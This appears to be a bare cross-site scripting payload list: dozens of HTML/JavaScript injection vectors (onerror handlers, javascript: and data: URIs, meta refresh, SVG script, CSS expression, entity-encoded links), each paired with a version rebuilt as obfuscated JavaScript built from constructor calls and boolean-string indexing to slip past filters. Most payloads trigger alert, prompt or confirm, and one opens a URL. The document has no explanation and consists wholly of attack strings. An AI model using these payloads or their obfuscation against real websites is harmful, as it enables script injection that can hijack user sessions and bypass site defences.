[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(false+"")[1]+(false+"")[2]+(true+"")[0]+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+([false]+"")[11]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+([false]+"")[12]+(false+[0]+"")[7]+(false+"")[1]+(false+"")[2]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(false+[0]+"")[2]+([false]+"")[10]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+([false]+"")[10]+(undefined+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+(false+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(true+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[14]+([false]+"")[11]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<iframe/src="data:text/html,<svg onload=prompt(209)>">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+(false+"")[0]+(true+"")[1]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; prompt(211)" http-equiv="refresh"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(true+"")[0]+(false+"")[1]+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[0]+(true+"")[3]+(undefined+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+(undefined+"")[1]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+(false+"")[2]+([false]+"")[10]+(undefined+"")[1]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+[0]+"")[7]+(+!+[]+[])[0]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+(undefined+"")[1]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+(false+"")[2]+([false]+"")[10]+(undefined+"")[1]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+[0]+"")[7]+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(113)")()+(undefined+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[1]+(true+"")[3]+(false+"")[0]+(true+"")[1]+(true+"")[3]+(false+"")[3]+(+(101))["to"+String["name"]]()[1]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[2]+([false]+"")[10]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[1]+(true+"")[3]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+([false]+"")[10]+(undefined+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[3]+(undefined+"")[1]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+[0]+"")[2]+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]
<meta http-equiv="refresh" content="0;url=javascript:confirm(215)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(true+"")[0]+(false+"")[1]+(false+[0]+"")[7]+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(113)")()+(undefined+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[1]+(true+"")[3]+(false+"")[0]+(true+"")[1]+(true+"")[3]+(false+"")[3]+(+(101))["to"+String["name"]]()[1]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[0]+(true+"")[3]+(undefined+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(undefined+"")[0]+(true+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[0]+([false]+"")[10]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<iframe src=javascript&colon;prompt&lpar;document&period;location&rpar;>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+(false+"")[0]+(true+"")[1]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+(undefined+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(undefined+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+(false+"")[1]+(true+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<form><a href="javascript:\u0061lert(219)">X
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[1]+(false+[0]+"")[7]+(+(101))["to"+String["name"]]()[1]+(true+"")[1]+(true+"")[3]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(false+"")[2]+(true+"")[3]+(true+"")[1]+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()
</script><img/*%00/src="worksinchrome&colon;prompt(221)"/%00*/onerror='eval(src)'>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+"")[3]+([false]+"")[10]+(undefined+"")[1]+([false]+"")[3]+(+(101))["to"+String["name"]]()[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+([false]+"")[11]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<style>//*{x:expression(prompt(/xss/))}//<style></style>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+([false]+"")[15]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+(true+"")[3]+(false+"")[3]+(false+"")[3]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([false]+"")[12]+([false]+"")[12]+([false]+"")[16]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src="/" =_=" title="onerror='prompt(225)'">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+(true+"")[0]+([false]+"")[10]+(true+"")[0]+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(227)>ClickMe
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[1]+(false+[0]+"")[7]+(false+"")[1]+(false+"")[1]+(false+[0]+"")[7]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+[0]+"")[7]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+[0]+"")[7]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+[0]+"")[7]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+[0]+"")[7]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+[0]+"")[7]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+[0]+"")[7]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+[0]+"")[7]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+"")[1]+(false+[0]+"")[7]+(+(101))["to"+String["name"]]()[1]+(true+"")[1]+(true+"")[3]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([][""]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(false+"")[2]+(true+"")[3]+(true+"")[1]+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+([false]+"")[3]+(false+"")[2]+([false]+"")[10]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]
<script x> prompt(229) </script 1=2
